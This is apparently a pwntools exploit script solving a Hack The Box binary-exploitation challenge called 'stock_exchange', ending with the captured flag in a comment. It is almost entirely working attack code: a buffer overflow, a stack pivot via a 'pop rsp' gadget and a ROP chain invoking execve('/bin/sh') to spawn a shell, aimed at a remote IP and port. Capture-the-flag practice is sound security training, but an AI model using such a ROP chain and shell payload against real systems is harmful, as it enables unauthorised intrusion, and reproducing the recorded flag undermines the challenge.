#!/usr/bin/python3

from pwn import *

exe = ELF('stock_exchange', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x000000000040134a
                b* 0x401182
                b* 0x000000000040130e
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('83.136.252.24', 49421)
else:
        p = process(exe.path)

GDB()
pop_rdi = rop.find_gadget(['pop rdi','ret']).address
pop_rsp = 0x00000000004013dd
pop_rdx = 0x0000000000401182
pop_rsi = 0x0000000000401180
syscall = 0x0000000000401186
pop_rax = 0x0000000000401184
def reg(usr, passw):
        sl( usr)
        sl(passw)
def info(id):
        sl( id)
        sl(b'0')
        sl(b'0')
        sl(b'0')
        sl(b'0')
payload =  b'a'*8*3 + b'a' * 0x8 + flat(
                        pop_rax, 0x3b,
                        pop_rdi, 0x404148,
                        pop_rsi, 0,
                        pop_rdx, 0,
                        syscall,
                        '/bin/sh\0'
                           )
print(len(payload))
reg('wan',payload)
payload = b'a'*24 + flat(
        pop_rsp,
        0x4040E0+0x8,
        exe.sym.main
)
info(payload)

p.interactive()
# HTB{P1v0t1ng_th3_5t4ck_f20dc1e!!}